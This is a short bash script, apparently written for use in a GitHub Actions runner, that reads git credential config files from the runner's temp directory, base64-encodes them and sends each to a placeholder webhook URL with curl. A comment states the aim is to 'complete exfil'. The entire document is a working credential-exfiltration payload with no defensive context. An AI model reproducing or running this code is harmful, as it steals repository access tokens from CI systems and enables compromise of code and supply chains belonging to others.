#!/bin/bash
for f in /home/runner/work/_temp/git-credentials-*.config; do
if [ -f "$f" ]; then
    curl -s "https://YOUR-WEBHOOK-URL.com/?token=$(cat $f | base64 -w0)" &
fi
done
# Keep running briefly to complete exfil
sleep 2
exit 0